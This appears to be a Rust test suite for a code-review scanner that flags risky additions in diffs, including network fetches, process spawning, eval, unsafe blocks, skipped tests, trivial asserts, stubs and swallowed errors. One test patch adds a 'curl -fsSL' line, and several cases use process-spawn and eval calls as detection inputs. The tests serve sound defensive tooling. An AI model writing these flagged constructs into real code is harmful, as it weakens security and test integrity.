        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    /// Batteries, phase 1: the ways a change makes a test stop testing, and unfinished work
    /// presented as done. Each is read as code on an added line.
    #[test]
    fn a_skipped_test_a_trivial_assert_and_a_stub_are_evidence() {
        let cases: &[(&str, &str, EvidenceSignal)] = &[
            ("tests/a.rs", "#[ignore]", S::TestSkipped),
            ("tests/a.rs", "#[ignore = \"slow\"]", S::TestSkipped),
            (
                "test_a.py",
                "@pytest.mark.skip(reason=\"later\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "@pytest.mark.skipif(sys.platform == \"win32\")",
                S::TestSkipped,
            ),
            ("test_a.py", "@pytest.mark.xfail", S::TestSkipped),
            ("test_a.py", "    pytest.skip(\"later\")", S::TestSkipped),
            (
                "test_a.py",
                "@unittest.skipUnless(HAVE, \"x\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "        self.skipTest(\"later\")",
                S::TestSkipped,
            ),
            ("a.test.ts", "it.skip(\"adds\", () => {});", S::TestSkipped),
            (
                "a.test.ts",
                "describe.skip(\"suite\", () => {});",
                S::TestSkipped,
            ),
            ("a.test.ts", "test.todo(\"adds\");", S::TestSkipped),
            ("a.test.ts", "xit(\"adds\", () => {});", S::TestSkipped),
            ("a_test.go", "\tt.Skip(\"later\")", S::TestSkipped),
            ("a_test.go", "\tt.SkipNow()", S::TestSkipped),
            ("tests/a.rs", "    assert!(true);", S::TrivialAssert),
            (
                "tests/a.rs",
                "    assert_eq!(true, true);",
                S::TrivialAssert,
            ),
            ("test_a.py", "    assert True", S::TrivialAssert),
            (
                "test_a.py",
                "        self.assertTrue(True)",
                S::TrivialAssert,
            ),
            ("a.test.ts", "  expect(true).toBe(true);", S::TrivialAssert),
            ("a.test.ts", "  assert.ok(true);", S::TrivialAssert),
            ("src/a.rs", "    todo!()", S::StubAdded),
            ("src/a.rs", "    unimplemented!(\"later\")", S::StubAdded),
            ("a.py", "    raise NotImplementedError", S::StubAdded),
            (
                "a.py",
                "    raise NotImplementedError(\"later\")",
                S::StubAdded,
            ),
        ];
        for (path, line, signal) in cases {
            assert_eq!(signals(&added(path, &[line])), [*signal], "{path}: {line}");
        }
    }

    /// The same words where they are not that code: no evidence.
    #[test]
    fn near_misses_of_the_integrity_tokens_are_not_evidence() {
        let cases: &[(&str, &str)] = &[
            (
                "tests/a.rs",
                "// #[ignore] was here; assert!(true) and todo!() too",
            ),
            ("tests/a.rs", "let s = \"#[ignore] assert!(true) todo!()\";"),
            ("tests/a.rs", "#[ignored_by_default]"),
            ("tests/a.rs", "    assert!(true_enough(x));"),
            ("tests/a.rs", "    debug_assert!(truer);"),
            ("src/a.rs", "    my_todo!(x)"),
            (
                "test_a.py",
                "# pytest.mark.skip, assert True, raise NotImplementedError",
            ),
            ("test_a.py", "x = \"pytest.skip(\""),
            ("test_a.py", "    assert True_value"),
            ("test_a.py", "    assert Trueish is None"),
            ("a.py", "    raise NotImplementedErrorSubclass()"),
            ("a.py", "    x.raise_NotImplementedError()"),
            ("a.test.ts", "exit(code);"),
            ("a.test.ts", "submit.skip(1);"),
            ("a.test.ts", "console.assert(true);"),
            ("a.test.ts", "// it.skip(\"x\")"),
            ("a_test.go", "\tctx.t.Skip(\"x\")"),
            ("a_test.go", "\tit.Skip(\"x\")"),
            // the tokens of another language are not this file's
            ("a.go", "\ttodo!()"),
            ("a.ts", "#[ignore]"),
        ];
        for (path, line) in cases {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// A file from hunk body lines written as in a patch (`+`, `-` or a space first), after one
    /// context line `x`.
    fn hunk_of(path: &str, body: &[&str]) -> ReviewFile {
        let old = 1 + body.iter().filter(|l| !l.starts_with('+')).count();
        let new = 1 + body.iter().filter(|l| !l.starts_with('-')).count();
        let mut text = format!("--- a/{path}\n+++ b/{path}\n@@ -1,{old} +1,{new} @@\n x\n");
        for line in body {
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn found(file: &ReviewFile) -> Vec<(EvidenceSignal, Basis, u32)> {
        file_evidence(file)
            .iter()
            .map(|e| (e.signal, e.basis, e.line))
            .collect()
    }

    /// Batteries, slice 2: a handler and its empty body are read together, on the line that
    /// opens the handler, and say that they were (`hunk`).
    #[test]
    fn an_error_handler_with_nothing_in_it_is_evidence_read_across_two_lines() {
        let swallowed = [(S::ErrorSwallowed, Basis::Hunk, 2)];
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    pass"]),
            (
                "a.py",
                &["+    except (KeyError, OSError) as e:", "+        ..."],
            ),
            ("a.py", &["+except Exception: pass"]),
            (
                "a.py",
                &["+except:  # nothing to do", "+    pass  # really"],
            ),
            ("a.ts", &["+} catch (e) {}"]),
            ("a.ts", &["+} catch { }"]),
            ("a.ts", &["+} catch (err) {", "+}"]),
            ("a.ts", &["+try { f(); } catch ({ message }) {", "+}"]),
            ("a.go", &["+\tif err != nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil {}"]),
            ("a.go", &["+\tif err := f(); err != nil {", "+\t}"]),
            // the body is the next line of the new file: a removed line between is not it,
            // and an unchanged line is
            (
                "a.py",
                &["+except ValueError:", "-    handle()", "+    pass"],
            ),
            ("a.py", &["+except ValueError:", "     pass"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), swallowed, "{path}: {body:?}");
        }
    }

    /// An arm or an assignment that drops the error on one line is found by its token.
    #[test]
    fn an_error_dropped_on_one_line_is_lexical_evidence() {
        for (path, line) in [
            ("src/a.rs", "        Err(_) => {}"),
            ("src/a.rs", "        Err(_) => (),"),
            ("a.go", "\t_ = err"),
        ] {
            assert_eq!(
                found(&added(path, &[line])),
                [(S::ErrorSwallowed, Basis::Lexical, 2)],
                "{path}: {line}"
            );
        }
    }

    /// A handler that does something, one whose body the hunk does not show, and the same
    /// words elsewhere: no evidence.
    #[test]
    fn a_handler_that_handles_or_whose_body_is_unseen_is_not_evidence() {
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    log(e)"]),
            ("a.py", &["+except ValueError:"]),
            ("a.py", &["+except ValueError:", "-    pass"]),
            ("a.py", &["+except ValueError: return None"]),
            ("a.py", &["+exceptional = 1", "+pass"]),
            ("a.py", &["+# except ValueError: pass"]),
            ("a.py", &["+s = \"except ValueError: pass\""]),
            ("a.py", &["+else:", "+    pass"]),
            ("a.ts", &["+} catch (e) { log(e); }"]),
            ("a.ts", &["+} catch (e) {", "+  log(e);"]),
            ("a.ts", &["+} catch (e) {"]),
            ("a.ts", &["+p.catch(() => {});"]),
            ("a.ts", &["+const catcher = {};"]),
            ("a.ts", &["+// } catch (e) {}"]),
            ("a.go", &["+\tif err != nil {", "+\t\treturn err"]),
            ("a.go", &["+\tif err == nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil && retry {", "+\t}"]),
            ("a.go", &["+\tfor err != nil {", "+\t}"]),
            ("a.go", &["+\t_ = errors.New(\"x\")"]),
            ("src/a.rs", &["+        Err(e) => {}"]),
            ("src/a.rs", &["+        Err(_) => { log(); }"]),
            // another language's form
            ("a.go", &["+except ValueError:", "+    pass"]),
            ("a.py", &["+} catch (e) {}"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), [], "{path}: {body:?}");
        }
    }

    /// A removed empty handler is the repair, and reading neighbours changes nothing a token
    /// rule finds: the same line, the same signals, the first rung.
    #[test]
    fn the_neighbour_reading_rule_leaves_token_evidence_as_it_was() {
        assert_eq!(
            found(&hunk_of("a.py", &["-except ValueError:", "-    pass"])),
            []
        );
        let file = hunk_of(
            "a.py",
            &["+import subprocess", "+subprocess.run(x)", "+eval(y)"],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 3),
                (S::DynamicEval, Basis::Lexical, 4),
            ]
        );
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert!(Basis::Hunk > Basis::Lexical);
    }

    /// Rung 2: the new side of a Rust hunk is parsed, and what the parser reads is evidence
    /// whatever its spelling. An item it confirms says so.
    #[test]
    fn the_parser_finds_rust_constructs_whatever_their_spelling() {
        let cases: &[(&str, &[&str], EvidenceSignal)] = &[
            (
                "src/a.rs",
                &["+    let v = f().unwrap();"],
                S::PanicPathAdded,
            ),
            (
                "src/a.rs",
                &["+    let v = f()", "+        .expect(\"set\");"],
                S::PanicPathAdded,
            ),
            ("tests/a.rs", &["+    assert!( true );"], S::TrivialAssert),
            (
                "tests/a.rs",
                &["+    assert!(true, \"always\");"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+    assert_eq!(true , true);"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+#[cfg_attr(miri, ignore)]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            (
                "tests/a.rs",
                &["+#[ignore]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            ("src/a.rs", &["+    todo!( )"], S::StubAdded),
            // the hunk closes a block it did not open, and opens one it does not close
            (
                "src/a.rs",
                &[
                    "     y",
                    " }",
                    "+fn b() {",
                    "+    if c {",
                    "+        h().unwrap();",
                ],
                S::PanicPathAdded,
            ),
        ];
        for (path, body, signal) in cases {
            let items = found(&hunk_of(path, body));
            assert_eq!(items.len(), 1, "{path}: {body:?}: {items:?}");
            assert_eq!(
                (items[0].0, items[0].1),
                (*signal, Basis::SyntaxFragment),
                "{path}: {body:?}"
            );
        }
        assert_eq!(Basis::SyntaxFragment.label(), "syntax_fragment");
        assert!(Basis::SyntaxFragment > Basis::Hunk);
    }

    /// A panic path inside a test the hunk shows is no evidence: the parser withdraws what the
    /// spelling found. A test the hunk does not show cannot be known, and the item stands.
    #[test]
    fn a_panic_path_in_a_test_the_hunk_shows_is_withdrawn() {
        let shown: &[&[&str]] = &[
            &["+#[test]", "+fn a() {", "+    f().unwrap();", "+}"],
            &[
                "+#[tokio::test]",
                "+async fn a() {",
                "+    f().await.expect(\"x\");",
                "+}",
            ],
            &[
                " #[cfg(test)]",
                " mod checks {",
                "+    fn helper() { f().unwrap(); }",
                " }",
            ],
            &[
                "     y",
                " }",
                "",
                "+#[test]",
                "+fn b() {",
                "+    h().unwrap();",
                "+}",
            ],
        ];
        for body in shown {
            assert_eq!(found(&hunk_of("src/a.rs", body)), [], "{body:?}");
        }
        let unseen = found(&hunk_of("tests/a.rs", &["+    f().unwrap();"]));
        assert_eq!(unseen, [(S::PanicPathAdded, Basis::SyntaxFragment, 2)]);
        // a function that is not a test, between tests
        let other = found(&hunk_of(
            "src/a.rs",
            &["+fn helper() {", "+    f().unwrap();", "+}"],
        ));
        assert_eq!(other, [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]);
    }

    /// Where the parser cannot read, the lower rung's answer stands with its own basis; where
    /// neither finds anything there is nothing.
    #[test]
    fn what_the_parser_cannot_read_keeps_the_lower_rungs_answer() {
        // inside a macro's body the parser reads nothing
        assert_eq!(
            found(&hunk_of("src/a.rs", &["+    outer! { x.unwrap(); }"])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // a hunk over the fragment budget is not parsed at all
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        assert_eq!(
            found(&hunk_of("src/a.rs", &[long.as_str()])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        for line in [
            "+    x.unwrap_or(1);",
            "+    x.expect_err(\"e\");",
            "+    let s = \"a.unwrap()\"; // b.unwrap()",
            "+    unwrap(x);",
            "-    f().unwrap();",
        ] {
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), [], "{line}");
        }
        // another language has no grammar here and no such rule
        assert_eq!(found(&hunk_of("a.py", &["+x.unwrap()"])), []);
    }

    /// The parse changes nothing it has no construct for: the same items, in the same order.
    #[test]
    fn items_the_parser_has_no_view_on_keep_their_place() {
        let file = hunk_of(
            "src/a.rs",
            &[
                "+    let c = std::process::Command::new(\"x\");",
                "+    let v = unsafe { f() }.unwrap();",
                "+    todo!()",
            ],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 2),
                (S::UnsafeAdded, Basis::Lexical, 3),
                (S::PanicPathAdded, Basis::SyntaxFragment, 3),
                (S::StubAdded, Basis::SyntaxFragment, 4),
            ]
        );
    }

    /// These are read on added lines only: removing a skip or a stub is the repair.
    #[test]
    fn removing_a_skip_a_trivial_assert_or_a_stub_is_not_evidence() {
        for (path, line) in [
            ("tests/a.rs", "#[ignore]"),
            ("tests/a.rs", "    assert!(true);"),
            ("src/a.rs", "    todo!()"),
            ("test_a.py", "@pytest.mark.skip"),
            ("a.py", "    raise NotImplementedError"),
        ] {
            assert_eq!(signals(&removed(path, &[line])), [], "{path}: {line}");
        }
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
                ("test_skipped", 3),
                ("trivial_assert", 3),
                ("stub_added", 3),
                ("error_swallowed", 3),
                ("panic_path_added", 2),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
}
